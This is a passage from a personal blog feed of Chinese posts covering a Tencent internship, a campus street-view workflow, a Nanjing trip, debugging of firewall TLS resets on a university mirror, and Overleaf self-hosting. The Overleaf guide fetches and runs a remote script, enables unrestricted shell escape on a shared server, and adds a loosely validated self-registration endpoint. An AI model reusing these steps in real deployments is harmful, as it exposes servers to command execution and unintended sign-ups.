询问未来的计划（读研，工作之类的）。 来自省份，学校（HR最开始以为南科大是广州的学校） 值得表扬的是腾讯的每一面都衔接的很紧，不会给人「感觉自己被挂了，但不知道自己是不是真的被挂了」的感觉。最后，在HR面完成之后的次周周二，我收到了Offer Call和邮件。所有的面试过程加起来，时间跨度不超过三周。\n入职第一天 办理入职与分配工位 入职第一天的主要工作就是走流程了，早上十点钟去老腾讯大厦二楼领取办入职手续和领取工卡，随后就被导师带去了部门所在的办公楼。入职的时候会发一本欢迎手册，一张贴纸和一换皮企鹅公仔（之所以说是换皮，是因为我们拿到的公仔是标准的腾讯企鹅公仔外面套着一个牛的外套，根据往年其他同学写的博客，他们的公仔是套着当年的生肖外套）。\n我所在的实习部门所在的办公楼是老腾讯大厦片区的松日鼎盛大厦。客观来说，松日鼎盛的环境是老腾大片区中较为不好的。具体表现与电梯较少（每13层只有4台电梯+2台消防梯），和工位的平均面积较其他楼层小。由于今年的实习生HC过多，我们较晚入职的实习生被分配到了会议室临时改造的工位进行办公（工位宽度基本和正式员工一致，但会议室不是特别透风），论人均面积，应该是和正式工位差不多大的，不过就没有工位之间的隔板了。根据这几周的参观经历，如果要为办公环境做个排序，那顺序应该是滨海\u0026gt;\u0026gt;腾大\u0026gt;松日=万利达。\n腾大片区。从左到右是汉京中心，大族，腾大，万利达，松日 部门为实习生配置的台式机配置一般，从身边同学了解到的信息，大部分的开发实习生分配到的都是i7-7500，8G内存（可申请添加到16G）的台式机和24寸1080P或27寸2K的屏幕。电脑预装的是Windows10，可以自己选择重装为Ubuntu18.04。（听说还是由于实习生太多，2K和1080p的屏幕（应该是正式员工更换下来的，腾讯从今年开始为正式员工标配4K显示器）数量不足，后来的实习生分配到的显示器都变成了27寸4K，和正式员工一致了）。\n在安装好电脑并入域之后，导师就向我讲解了一下本部门的工作。我所在部门全称为「CSIG的云技术运营服务部计算技术中心」，主要的工作负责对接腾讯云和自有IDC在操作系统和硬件层面的排障与研发，同时也会时常参与一些专项（如大规模的集群升级/迁移）的技术支持，用一个词来描述的话，SRE或者System Engineer可能比较合适（不过部门一般不管软件本身的逻辑，而重点负责软件运行于特定系统上发生问题的排障与研发）。部门正式员工的工作时间制度是10-10-5。\n松日外面的晚霞 工作 根据导师的说法和综合其他几位同在技术运维组，并且职位为「系统技术」下同学的说法，在实习阶段，实习生是基本不会被分配到需要进行「发布到生产环境」的任务的。因此的任务主要还是以「带薪学习」，具体来说，就是导师会给一些案例和学习方向，并会分配测试用的服务器给我们，我们需要做的就是分析导师给的生产环境和总结新学到的知识，并把这些东西总结成文档（有点类似于实验报告）即可，并每日发日报给导师。目前导师建议我学习的方向主要集中在Linux的IO与虚拟化这部分。导师也表示，相关的报告和总结会作为转正的参考~~（既然是「带薪学习」，也只能参考这些了）~~。\n在同一个会议室内，还有其他来自区域支持（大客户服务），运维开发（开发）和生态支持（产品经理）部门的实习生，其中区域支持和运维开发的同学都表示，在第一周之后，他们也要参与一些生产环境的开发/客户服务的工作，尤其是区域支持的同学。如此看来，可能是因为技术运维的职位比较看重经验，并且容易出现运维事故，导师自然也不太敢让实习生直接操作生产环境了。不过换个角度说，由于技术运维经验越多越吃香，这可能是一个没那么具有「35岁危机」的岗位（部门里确实有不少同事都在35岁以上）。\n松日每层有两个茶水间，里面有一台现磨咖啡机和若干的茶包可以自取。\n茶水间 权限 暑期实习生和正式员工一样都是蓝卡，不过在访问内网资源的时候，权限上略有区别。具体来说就是实习生不能访问公司的「内网知乎」和一个用于购买福利纪念品（比如T恤衫）的地方。另外，实习生的邮箱默认是不能接收外部（@tencent.com之外）的邮件和向外部邮箱发送邮件的。\n食堂 在中午或者晚上，大家一般倾向于去万利达大厦和老腾讯大厦吃饭（具体的原因是松日的餐饮质量实在不敢恭维，身边的同学纷纷表示「比学校食堂还要难吃」），但万利达和腾大的食堂还是不错的。如果要把这几栋楼的餐饮质量做个排序，那具体的排名应该是腾讯大厦\u0026gt;万利达\u0026gt;\u0026gt;松日。\n从腾大避难层向南看深圳大学，深圳大学另一边的楼是腾讯滨海大厦 腾讯的早餐10:00之前免费；如果当天加班到8PM之后（我所在的部门肯定是满足这个条件的），可以拿到一张夜宵券，这张券可以抵用大部分食堂的一份晚饭套餐（少数套餐需要两张夜宵券）或者楼下麦当劳肯德基的一份套餐。午餐每餐的价格则大致为20元。腾大片区的楼下有若干家7-11便利店和一家喜茶Go，如果不想中午吃食堂，也可以去7-11买饭团吃。\n班车 在腾大片区，大部分的班车都会停在科技中一路上。在早上，到达的班车基本需要在这条路上等候5分钟才能到达下车的位置。不过相比于挤地铁，班车还是更舒服一些。由于我没有在公司旁边租房，还是从学校上下班，每天大概需要花一个半小时在路上。\n作息 07:30起床-\u0026gt; 08:00出校门-\u0026gt; 08:10上班车-\u0026gt; 08:50下班车-\u0026gt; 09:35吃完早饭-\u0026gt; 09:45到工位-\u0026gt; 12:00午餐-\u0026gt; 13:10午休-\u0026gt; 14:10起床-\u0026gt; 17:40晚餐-\u0026gt; 19:00回工位-\u0026gt; 20:50下楼等班车-\u0026gt; 21:10上班车-\u0026gt; 22:00回到学校 如果是在公司附近租房，每天应该能够8:30起床，下班之后也只需要9:30就能回到家中了。\n总结 参考文章 腾讯实习的第一周 | KeybrL\u0026rsquo;s Blog ","permalink":"https://blog.sparktour.me/posts/2021/07/04/tencent-intern-first-impression/","summary":"\u003ch1 id=\"腾讯实习初体验\"\u003e腾讯实习初体验\u003c/h1\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2021/tencent-intern-first-impression/banner.jpg\" alt=\"\"  /\u003e\n    \u003cfigcaption\u003e\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003e说起来这个实习的来历还十分坎坷。在三月份的实习申请季，学院为我们推荐了华为海思的实习，可海思的实习笔试占比的绝大部分均是和verilog和验证有关的题目，而这正好触碰到了我知识的盲区😂（我们的课题组主要做的是生物与光学器件的仿真）。在被华为挂了之后，我「病急乱投医」地把阿里和腾讯都投了一遍。在选择岗位时，想到自己不是科班出身，只对运维方面的事务略有了解，于是就选择了腾讯的技术运营和阿里的基础架构开发。\u003c/p\u003e","title":"腾讯实习初体验"},{"content":"为校园生成街景 给学校做一个街景是大一入学以来一直以来的一个愿望了。在大二的时候，我们已经为学校拍摄了数张航拍全景，本想打算以此为基础为学校做一个完整的全景覆盖的，可惜疫情之后学校就不再让学生在未经老师允许的情况下飞行无人机了。街景的实现方式也从无人机变成了土制街景单车（误）。\n拍摄前准备 从这张拍摄中截取的街景图片中能够看到土制街景单车的基本配置。全景车的基础是一台自行车，并且在车辆的车把左半部分通过GoPro通用接口挂接了相机的自拍杆，右边用于放置记录地理信息和罗盘方位的手机或者其他GPS设备。\n土制街景单车 全景相机 这次拍摄使用的全景相机是Insta360 One X，两侧各有一个1200万像素的全景镜头，拼合起来的图片为6080*3040，大概1800万像素。成像质量一般，拉近来看估计还没有大部分手机的广角镜头好。\n本次拍摄时，我们使用了一个自拍杆接在相机上，并把相机接进了车头上的转接件里。但这种方案一旦车动起来，自拍杆是没有办法保持垂直的（也许可以使用下图的这种方法，但看起来不是很好保持相机的水平和方向）。因此我们还需要用一只手稳住自拍杆，另一只手操控车把和刹车。（在此情况下，请做足个人保护措施，勿使用抓住自拍杆的手单手骑车，并时刻注意周边环境！）\n挂载全景相机的一个例子 手机/GPS Insta360 One X是没有内置GPS的（App里面的记录GPS选项只能记录第一张照片的GPS，约等于没用）。因此我们需要在车把右侧挂载手机用于记录GPS和图片的拍摄方位。这里推荐使用OSMTracker for Android来进行记录。在导出数据的时候，需要在Settings-Export compass heading里面勾选in extension 来把方向（指南针）数据导出到GPX文件里面。\n拍摄 在约8km/h的骑车速度下，将相机设置成间隔拍摄，5秒拍摄一张即可，这样两张图之间大概会间隔10米左右。\n后期处理 在手机记录完GPX数据之后，我们可以在应用里面选择以GPX格式导出即可。\n修正GPX数据偏移 这应该属于One X的一个硬件Bug，相机的EXIF时间戳总是会比相机时钟慢上10秒左右。同时，长期不连接手机还会造成其他的时钟偏移问题。因此，我们需要首先寻找EXIF时间戳和GPS的时间差。由于没有其他的参考，这次拍摄中我们就只能使用卫星图和拍摄出来的周围景色对照来计算时间偏差了。\n万幸的是，南科大的校园里有大量的黄色减速带。减速带大概长这样：\n找不到本校的减速带照片了，图中是CUHK的减速带 使用Geosetter将经过减速带时图片的EXIF时间戳和通过减速带时GPX的时间戳进行对比，我们就可以计算出相机时钟的漂移了。（这个软件还能显示图片EXIF中的方位和叠加GPX路径，在验证GPX路径的时候相当方便）\nGeosetter的界面 通过GPSBabel，我们就能快速偏移GPX轨迹的时间戳，对齐EXIF时间戳和GPX时间戳了：\ngpsbabel -t -r -w -i gpx -f intput.gpx -x track,move=+12s -o gpx -F out.gpx （在拍摄中，第一天的偏移是11s，第二天是51s）\n修正指南针数据标签 由于在将geotag数据标记到图像EXIF数据的过程中，exiftool读取不到原始GPX数据的坐标。我们需要将GPX文件中方向的tag进行修正。在GPX文件中，将所有的\u0026lt;compass\u0026gt;标签改为\u0026lt;course\u0026gt;即可。\n通过delta GPS坐标修正图片方向 万一你的手机没能记录下正确的方向数据，我们也可以用求GPS轨迹切线斜率的方法得出大致的方向。使用下方的python代码即可：\nimport numpy as np import pandas as pd from geographiclib.geodesic import Geodesic import xml.etree.ElementTree as ET gpx_tree = ET.parse(\u0026#39;input.gpx\u0026#39;) gpx_root = gpx_tree.getroot() # 2520是gpx的路径点数量 for i in (range(0,2520)): gpx_root[1][1][i][2][1].text = str((float(gpx_root[1][1][i][2][1].text) + 180)%360) # 如果相机的显示器这一面与行车方向相反，则需要把路径调转180度 gpx_tree.write(\u0026#39;modified.gpx\u0026#39;) Geotag 使用exiftool完成即可，需要注意GPX文件/图片的EXIF有可能是不带时区的，因此同步位置信息的时候还需要添加一个时区偏移（8小时即28800秒）。(其他的同步选项可以参考这个网页)\nexiftool -geotag output.gpx -geosync=+28800 DIR 模糊车牌和人脸 根据mapillary论坛上网友的建议，本次我们选择使用understand-ai/anonymizer来模糊街景中的车牌和人脸。将repo clone下来之后，新建一个python3.6的anaconda环境，按照requirements.txt里面的包安装即可。程序第一次运行的时候需要从Google Drive下载模型，此处可能需要添加代理。\nPYTHONPATH=$PYTHONPATH:. python anonymizer/bin/anonymize.py --input input-folder --image-output output-folder --weights weights --face-threshold=0.1 --plate-threshold=0.1 --obfuscation-kernel 47,1,9 使用GTX1660Ti显卡时，模型的处理速度大约是2秒一张图。\n处理进度图 同步EXIF 模糊完车牌和人脸之后的文件也被抹去了exif信息，这时还需要用输入图片同步EXIF数据到输出图片。\n# copy EXIF as a block between same-named JPG files in different directories exiftool -tagsfromfile SRCDIR/%f.%e -exif -ext jpg DSTDIR 生成全景网页 使用pano2VR生成即可。这个软件提供了制作街景中比较关键的设置图像联系，添加控制按钮等功能。\n在软件自动生成完全景之后，可能需要自己处理一下节点之间不正确的连接关系和GPS位置错误的图像。\npano2vr的界面 最后导出即可。\nDemo Link ","permalink":"https://blog.sparktour.me/posts/2021/06/16/campus-streetview/","summary":"\u003ch1 id=\"为校园生成街景\"\u003e为校园生成街景\u003c/h1\u003e\n\u003cp\u003e给学校做一个街景是大一入学以来一直以来的一个愿望了。在大二的时候，我们已经为学校拍摄了数张航拍全景，本想打算以此为基础为学校做一个完整的全景覆盖的，可惜疫情之后学校就不再让学生在未经老师允许的情况下飞行无人机了。街景的实现方式也从无人机变成了土制街景单车（误）。\u003c/p\u003e","title":"为校园生成街景"},{"content":"南京出差杂记 上周因为课题组交流，与课题组的同学一起去南京大学仙林校区出了一周差。这样算起来，应该是本科以来第一次公费出差吧。本文旨在记录一些出差时遇到的趣事。\n您能在图中找到南科大吗？（提示：可以通过南坪快速的灯光寻找） 网络与Eduroam ep.nju.edu.cn 南京大学的eduroam网络并不是一个典型的，通过802.1x进行身份认证的eduroam网络（他的SSID也是大写的EDUROAM，而不是官方建议的eduroam）。\nEDUROAM认证成功后的界面 南大的EDUROAM本身为开放网络，在连接上后，客户端需要手动访问ep.nju.edu.cn，通过portal认证才能上网，连接限两个设备，连上后只分配v4地址。不过学校给的限速是100Mbps，对比之下在高校中算是比较高的了（但终归比不过目前不限速的妮可校园网）。\n网络结构 南大的网络拓扑倒是没找到什么公开的资料，能找到的简介只有人工微结构科学与技术协同创新中心的姚舸工程师在2007年所写的一些资料，不过这些资料成文的时候，仙林校区才刚刚开始建设。随后又找到了这位工程师在2020年所作讲座的一个PPT，里面的 Load Balancer 的IP在ipip.net中被显示为了「栖霞区」，因此推测这些设备应该已经迁入了仙林校区了。\n我校浦口校区和鼓楼校区通过过江光缆互联，光纤从浦口经中国教育网华东北地区中心（东南大学）再到鼓楼网络信息中心进校，现校内绝大部分资源和服务器都在鼓楼校区。\n校园 和南科大比，南大仙林的校园给博主的第一感觉就是大。除了最后一天之外，我们的活动范围仅仅局限于校园的西侧（平时实验的地点主要在化工楼）。在最后一天的晚上，我和另一位同学开了一辆单车，才勉强绕着校园骑了一圈（南大校园东北侧的天文学院与南科大的欣园挺类似的，都是需要上一个大长坡，通过一个山包才能到达）。\n查看更大的地图 学生宿舍中间的道路（看起来是禁止机动车通行的） 哈罗单车 和不允许本科生骑电动车，不允许共享单车进校园的南科大比，南大不知道高到哪里去了南大校内有许多支付宝旗下的「校园版哈罗单车」（校园版的意思就是，不能把车骑出大学城）价格是¥1.5/30min，和美团持平。\n化工楼下的自行车和电动车 食堂 南大的食堂选择很多，每餐的消费除了一个日料店之外都没有超过¥15，和南科大新开的窗口动辄¥20的消费比，还是相当平价的。\n西门 和中山大学的牌楼类似，南大的西门牌楼的背后，也被刻上了民国时期的校名「国立中央大学」。\n地铁站 南大仙林校区站 南大仙林校区有一个专门以他为名的二号线车站，之前在网上看到过南京地铁的导视设计最开始是师从MTR的，遂希望能在车站中寻找一些「港 铁 化」的遗迹，不过车站里面使用港铁宋和Myraid的指示牌，只剩下入口的一块「进站乘车」的牌子，其他的标示牌都如上图一样换成了黑体。\n南京地铁的英文翻译也十分奇怪，除了南大站使用了和学校标准译名接轨的翻译外，其他的地名一律被翻译成了拼音（包括路（LU），园（YUAN）等理论上有对应的英文翻译的事物。\n二号线上的到站显示PIDS是传统的LED点阵屏幕，现在似乎也比较少见了。（博主只在香港大规模更换电视PIDS之前见到过，深圳的地铁则是自开通起就使用电视作为PIDS显示列车信息了）。\n南京的地铁内部照明是暖光，这点在大陆的城轨系统似乎比较少见（深圳只有4号线的车是这样的）。\n周边 南大仙林校区的周边还是挺荒凉的，除了地铁站一侧有一些商店和南大教师公寓之外，从西门出去就只能看到学校旁边的G25高速公路，和几个人烟稀少的科技园了。仔细想想，应该是南京大学城并没有像深圳大学城或者广州大学城（岛）那样的城中村，自然也就少了一些「烟火气」了。\n在出差时我问和我一起来的同学「你更喜欢南大还是南科大的环境」，那位同学还是认为南大好一些，因为「有每天可以吃不重样的食堂，和面积是南科大两三倍的校园（并且不大部分的地势都是平地，上下课不用上下山」。不过如果只论环境的话，博主还是认为南科大的环境略胜一筹，尤其是在学校旁边有了宝能城这个巨大的购物中心之后，而且南科大的交通也明显比南大方便一些吧。\n一些图片 飞机上的晚霞 ","permalink":"https://blog.sparktour.me/posts/2021/05/18/trip-to-nanjing/","summary":"\u003ch1 id=\"南京出差杂记\"\u003e南京出差杂记\u003c/h1\u003e\n\u003cp\u003e上周因为课题组交流，与课题组的同学一起去南京大学仙林校区出了一周差。这样算起来，应该是本科以来第一次公费出差吧。本文旨在记录一些出差时遇到的趣事。\u003c/p\u003e","title":"南京出差杂记"},{"content":"本文是2021年4月时，南科大镜像站遇到的TLS连接重置问题的调试存档。一句话概括情况：在校外向镜像站公网v4地址(116.7.234.220)的TCP 443端口发起的首个HTTPS连接会被中间设备(middlebox)抢答并阻断，镜像站主机根本没有收到这条TCP连接相关的数据包。\n简介 在校外向镜像站公网v4地址(116.7.234.220)的TCP 443端口发起的首个HTTPS连接会被中间设备(middlebox)抢答并阻断，镜像站主机根本没有收到这条TCP连接相关的数据包。\n在北京时间09:00-24:00这个问题可被重现的概率极高，在凌晨则似乎不易发生。推测与中间设备负载或出口带宽使用率有关。\n中间设备似乎在截获一个TLS Client Hello后便会放行该IP随后向443端口发起的TCP连接。此放行规则的超时时间似乎不定，大致为30分钟至一个半小时。\n问题影响的范围 最早是在镜像站公网IPv4地址的TCP 443端口上观察到的。公网IPv4地址于TCP 80端口提供的HTTP服务及IPv6地址则不受影响。\n随后的测试发现学校电信出口116.7.234.0/24网段下一些IP的443端口同样会受此问题影响，但频率似乎不如镜像站的116.7.234.220高。教育网出口110.65.147.0/24下找到了一个似乎受此问题影响的IP，但在随后申请到的教育网IP上则无法复现。\n如何复现 在客户端启动抓包软件。参考命令：tcpdump -i eth0 -n -w /tmp/test.pcap host 116.7.234.220\n然后反复执行下方命令，观察抓包记录。\ncurl http://116.7.234.220:443/ --max-time 5 -v -o /dev/null 可见TCP握手能正常进行，但客户端发出的HTTP请求却一直不被响应：尽管客户端的TCP栈不断尝试重传承载它的PSH,ACK包，但对方始终不发回ACK。\n可同时在镜像机器同时抓包确认，此TCP连接相关的数据包没有到达内网中的镜像机。由此推测，此连接被中间设备截获并抢答了。\n其后可执行 curl https://116.7.234.220/ -v -o /dev/null\n本地抓包记录可见，客户端发出TLS Client Hello后，对方会直接返回RST包终止此条TCP连接。镜像机上未见相关的数据包。\n根据观察，RST包被成功触发后，在一段时间内此中间设备便不会再干涉外界与镜像站443端口的通信，能正常建立TLS连接。尝试在443端口进行HTTP请求能正常收到nginx发出的400 Bad Request响应。\n调试结论简述 学校使用的边界防火墙由华为提供（USG9500）。在与厂商的技术人员调试的过程中，我们发现根据ACL规则的匹配记录，在问题发生时，外部发往公网443端口的包似乎不能完成NAT并转发至对应的内网IP。\n针对80端口的ACL计数规则。可见来机客户端、目的地址为镜像站公网IP的报文数量与目的地址为其内网IP的相等（分别对应rule 5和rule 15）\nAdvanced ACL 3001, 4 rules ( Reference counter 1 ) Acl\u0026#39;s step is 5 rule 5 permit tcp source \u0026lt;client-public-ip\u0026gt; 0 destination 116.7.234.220 0 destination-port eq www (16 times matched) rule 10 permit tcp source 116.7.234.220 0 source-port eq www destination \u0026lt;client-public-ip\u0026gt; 0 (16 times matched) rule 15 permit tcp source \u0026lt;client-public-ip\u0026gt; 0 destination \u0026lt;mirror-intra-ip\u0026gt; 0 destination-port eq www (16 times matched) rule 20 permit tcp source \u0026lt;mirror-intra-ip\u0026gt; 0 source-port eq www destination \u0026lt;client-public-ip\u0026gt; 0 (16 times matched) 然而针对443端口进行的统计则出现了异常情况，看起来防火墙收到了公网一侧的包，但没有将它发往预想中的镜像站内网IP（见rule 5与rule 15的命中次数差异）\nAdvanced ACL 3001, 4 rules ( Reference counter 1 ) Acl\u0026#39;s step is 5 rule 5 permit tcp source \u0026lt;client-public-ip\u0026gt; 0 destination 116.7.234.220 0 destination-port eq https (3 times matched) rule 10 permit tcp source 116.7.234.220 0 source-port eq https destination \u0026lt;client-public-ip\u0026gt; 0 (0 times matched) rule 15 permit tcp source \u0026lt;client-public-ip\u0026gt; 0 destination \u0026lt;mirror-intra-ip\u0026gt; 0 destination-port eq https (0 times matched) rule 20 permit tcp source \u0026lt;mirror-intra-ip\u0026gt; 0 source-port eq https destination \u0026lt;client-public-ip\u0026gt; 0 (0 times matched 当443端口的重置行为被客户发来的TLS Client Hello包触发后，防火墙上针对443端口的统计信息也恢复正常。此现象与443端口的重置问题发生的时机似乎有很强的相关性。\n到此（3月25日下午），华为的驻场工程师已经认识到了问题，并将它反馈给他们内部了。\n3月31日上午，华为的驻场工程师表示他在查防火墙日志时发现一个机制的行为有些可疑，将其关闭后经测试443端口的问题消失。他与学校信息中心老师协商后决定将此功能的阈值调大，经过一些测试，镜像站目前的流量规模似乎不会触发中间人问题了。\n问题似乎已经解决，然而我们暂未得知此功能的具体名称以及预期行为（比如它为什么会对TLS连接进行截获TLS Client Hello的攻击）。尚不清楚未来若镜像站的对外带宽提升，是否会再次受类似的问题影响，\n调试杂项记录 在外界对116.7.234.220发起traceroute，发现对于ICMP包和UDP包最后一个返回ICMP Time Exceeded消息的路由器IP为183.56.64.2或183.56.64.10。推测此跳为深圳电信接入侧的路由器，记它的跳数为N。\n若对TCP 80端口及正常状态下的TCP 443端口使用TCP SYN包进行traceroute测试，可测得响应的SYN ACK包来自第N+3跳，且N+1与N+2跳均不会返回ICMP Time Exceeded消息。\n在问题发生时，TTL为N+1的SYN包即可触发中间设备返回SYN ACK包。此外还可以通过指定socket的TTL值确认\n可使用nmap提供的nping工具构造TCP包并traceroute，如：nping --tcp --traceroute --dest-ip 116.7.234.220 -p 443 --flags syn\nnping在TCP Probe（而非TCP connect）模式下会直接通过raw socket发送已构造的TCP包，内核的TCP栈不会参与。为了避免内核的TCP栈发送RST包干扰中间设备的状态机，在开始测试前可使用iptables规则丢弃发往被测IP的RST包。\niptables -I OUTPUT -p tcp -d 116.7.234.220 --tcp-flags RST RST -j DROP 另外可通过调整socket选项构造出具有特定TTL的TLS Client Hello包，以精确触发问题中间设备的重置行为。使用Python的一个例子：\nimport socket import ssl hostname = \u0026#39;116.7.234.220\u0026#39; context = ssl.create_default_context() N=17 with socket.create_connection((hostname, 443)) as sock: sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, N+1) with context.wrap_socket(sock, server_hostname=hostname) as ssock: print(ssock.version()) 值得一提的是，由于运营商可能会在中间路由使用ECMP等负载均衡策略，拥有不同五元组的包在跳数上可能有差异，因此尝试使用TTL定位问题时应当确认中间路由拓扑层级的稳定。\n我们于3月21日按照前述方法进行了测试（使用http协议请求南科大所有对公网开放的服务的443端口，预期情况应为返回400 bad request，如果出现了之前所反馈的问题，请求将一直超时，不过由于我们设置了5秒的timeout时间，因此在请求结果中，请求时间大于5秒的数据，均可以被认为是被学校的防火墙设备干扰了）：\n结果如下如图/表所示（测试每10分钟进行一次，分别从深圳阿里云，深圳电信和香港宽频发起，3月21日大约进行了约700次测试）：\nIP 重置次数 服务性质（猜测） 116.7.234.143 461 网站群服务 116.7.234.50 380 VPN 116.7.234.220 291 镜像站 116.7.234.158 211 健康申报 116.7.234.3 116 官网 116.7.234.184 38 Blackboard 110.65.147.164 13 Blackboard 116.7.234.97 10 110.65.147.163 6 116.7.234.24 5 116.7.234.209 3 116.7.234.94 2 总计 1536 根据华为驻场工程师的说法：\n由于你们的公网只有一个IP，都指向了443端口，流量大了后，会触发防火墙的攻击防范机制，超过了攻击防范机制的默认数值，所以导致了丢弃的情况\n工程师现已调大了攻击防范机制的阈值，链接被重置的情况应该会有较为显著的改善。\n我们将持续跟踪此问题。\n","permalink":"https://blog.sparktour.me/posts/2021/04/25/huawei-usg9500-firewall-tls-reset-issue/","summary":"\u003cp\u003e本文是2021年4月时，南科大镜像站遇到的TLS连接重置问题的调试存档。一句话概括情况：在校外向镜像站公网v4地址(116.7.234.220)的TCP 443端口发起的首个HTTPS连接会被中间设备(middlebox)抢答并阻断，镜像站主机根本没有收到这条TCP连接相关的数据包。\u003c/p\u003e","title":"处理华为核心防火墙导致的TLS连接重置问题"},{"content":" image.png 迫于大学对$LaTeX$排版软件的需求，自己帮忙为所在的大学部署了Overleaf的社区版本，并配置了完整的宏包支持，Shell Escape （用于代码高亮宏包minted）与自助注册功能。\n以下配置步骤已在sharelatex:2.6.1上成功测试。\n从3.1开始，Overleaf更换了下面所属的一些前端文件的目录，总的来说是把/var/www/sharelatex/里的东西全部迁移到了/overleaf/services/下面。因此如果使用是3.1及之后的overleaf镜像的话，需要注意替换一下需要修改的文件所在的目录。 安装 Overleaf为社区版本的安装提供了一个名为“Overleaf Toolkit”的工具，直接按照repo中的教程安装即可。\n安装的过程中，相关脚本会创建一个名为sharelatex的container，根据Overleaf Wiki上的说明，目前安装的Overleaf中的TexLive版本仅为精简版，因此我们需要先安装上完整版的TexLive。\n执行docker exec -it sharelatex bash进入容器，然后开始进行配置。\n完整宏包支持（完整版TexLive） 参考 https://yxnchen.github.io/technique/Docker部署ShareLaTeX并简单配置中文环境/#安装并配置ShareLaTeX\n# 进入容器的命令行（sharelatex容器本质上是一个Ubuntu） $ docker exec -it sharelatex bash # 进入texlive默认安装目录 $ cd /usr/local/texlive # 复制2020文件夹为2021 $ cp -a 2020 2021 # 下载并运行升级脚本 $ wget http://mirror.ctan.org/systems/texlive/tlnet/update-tlmgr-latest.sh $ sh update-tlmgr-latest.sh -- --upgrade # 更换texlive的下载源 $ tlmgr option repository https://mirrors.sustech.edu.cn/CTAN/systems/texlive/tlnet/ # 升级tlmgr $ tlmgr update --self --all # 安装完整版texlive（漫长的等待，不要让shell断开） $ tlmgr install scheme-full # 推出sharelatex的命令行界面，并重启sharelatex容器 $ exit $ docker restart sharelatex # 安装Noto字体（可选） $ apt install fonts-noto-cjk 代码高亮（Minted包）支持 参考 https://harrychen.xyz/2020/02/15/self-host-overleaf-scientifically/\n安装Python和pygments #pygments 是用于代码高亮的包 $ apt install python3 $ apt-get install python-pygments 由于在安装完整版TexLive的时候已经安装了minted包了，现在就不需要另外安装了。\n配置Shell Escape 修改/usr/local/texlive/2020/texmf.cnf，在最底下添加一行shell_escape = t\n% (Public domain.) % This texmf.cnf file should contain only your personal changes from the % original texmf.cnf (for example, as chosen in the installer). % % That is, if you need to make changes to texmf.cnf, put your custom % settings in this file, which is .../texlive/YYYY/texmf.cnf, rather than % the distributed file (which is .../texlive/YYYY/texmf-dist/web2c/texmf.cnf). % And include *only* your changed values, not a copy of the whole thing! % shell_escape = t 配置完成后重启容器。\n配置自助注册 由于Overleaf对社区版的限制（可能是为了推销Server Pro），社区版的Overleaf默认不支持注册，进入注册页面之后只能看到一个please contact mail@example.com to create an account.的提示。但是管理员是可以通过网页操作帮助用户创建账户的，因此我们可以用为管理员提供的用户注册界面魔改一个面向用户的注册界面。\n修改router.js Overleaf的后端是用Node.js写的，因此首先观察/var/www/sharelatex/web/app/src/router.js（https://github.com/overleaf/web/blob/master/app/src/router.js#L929-L939），可以发现给管理员用的注册页面是通过POST /admin/register来实现注册的。因此我们在下面添加一个专门用于给用户注册的router，以及给这个router加上白名单（让未注册用户也能访问）：\nwebRouter.post( \u0026#39;/self-register\u0026#39;, UserController.register_public ) webRouter.get( \u0026#39;/self-register\u0026#39;, UserPagesController.registerPage ) AuthenticationController.addEndpointToLoginWhitelist(\u0026#39;/self-register\u0026#39;) 修改注册函数 之后我们可以找到UserController.register这个函数的位置/var/www/sharelatex/web/app/src/Features/User/UserController.js (https://github.com/overleaf/web/blob/master/app/src/Features/User/UserController.js#L459)，在这个函数下面新增一个用于自助注册的函数：\nregister_public(req, res, next) { const { email } = req.body valid_edu = (/edu.cn\\s*$/.test(email)) if (email == null || email === \u0026#39;\u0026#39; || !valid_edu) { return res.sendStatus(422) // Unprocessable Entity } UserRegistrationHandler.registerNewUserAndSendActivationEmail( email, (error, user, setNewPasswordUrl) =\u0026gt; { if (error != null) { return next(error) } setNewPasswordUrl = \u0026#34;Please check your inbox.\u0026#34; res.json({ email: user.email, setNewPasswordUrl }) } ) }, 由于我们可能只希望学校内部的人员可以注册，因此我们可以在邮箱格式判断上再加一条判断邮箱后缀或域名的规则（见上）。另外，在自助注册时，我们只希望用户从邮件中看到验证链接，而不能直接看到验证链接，因此我们需要把变量setNewPasswordUrl，设置成如“请检查收件箱”这样的提示语。\n修改前端函数 我们还需要修改前端的函数，以便前端网页能够直接向我们在router.js里面写的注册url 发送数据。\n修改/var/www/sharelatex/web/frontend/js/main/register-users.js (https://github.com/overleaf/web/blob/master/frontend/js/main/register-users.js#L32)，在registerUsers()下面再新建一个registerUsers_pub()函数用于自助注册。\n添加完之后的完整return如下：\nreturn ($scope.registerUsers = function() { const emails = parseEmails($scope.inputs.emails) $scope.error = false return Array.from(emails).map(email =\u0026gt; queuedHttp .post(\u0026#39;/admin/register\u0026#39;, { email, _csrf: window.csrfToken }) .then(function(response) { const { data } = response const user = data $scope.users.push(user) return ($scope.inputs.emails = \u0026#39;\u0026#39;) }) .catch(() =\u0026gt; ($scope.error = true)) ) }, $scope.registerUsers_pub = function() { const emails = parseEmails($scope.inputs.emails) $scope.error = false return Array.from(emails).map(email =\u0026gt; queuedHttp .post(\u0026#39;/self-register\u0026#39;, { email, _csrf: window.csrfToken }) .then(function(response) { const { data } = response const user = data $scope.users.push(user) return ($scope.inputs.emails = \u0026#39;\u0026#39;) }) .catch(() =\u0026gt; ($scope.error = true)) ) }) 重新编译前端 在/var/www/sharelatex/web/下运行npm run webpack:production\n(如果webpack报错，很有可能是npm的版本太低，使用npm install -g npm 更新npm，随后执行npm i再执行webpack命令即可)\n随后修改/var/www/sharelatex/web/app/views/user/register.pug，将它改成和/var/www/sharelatex/web/app/views/admin/register.pug类似的结构（注意需修改注册使用的POST函数为刚刚新建的registerUsers_pub() ）：\nextends ../layout block content .content.content-alt .container .row .col-md-12 .card(ng-controller=\u0026#34;RegisterUsersController\u0026#34;) .page-header h1 Register New Users .row-spaced.ng-cloak p This page only allows email ends with edu.cn to register. p If you use other email address ends with other domain, please contact service@cra.moe . form.form .row .col-md-4.col-xs-8 input.form-control( name=\u0026#34;email\u0026#34;, type=\u0026#34;text\u0026#34;, placeholder=\u0026#34;jane@example.com, joe@example.com\u0026#34;, ng-model=\u0026#34;inputs.emails\u0026#34;, on-enter=\u0026#34;registerUsers_pub()\u0026#34; ) .col-md-8.col-xs-4 button.btn.btn-primary(ng-click=\u0026#34;registerUsers_pub()\u0026#34;) #{translate(\u0026#34;register\u0026#34;)} .row-spaced(ng-show=\u0026#34;error\u0026#34;).ng-cloak.text-danger p Sorry, an error occured, check your email address or contact 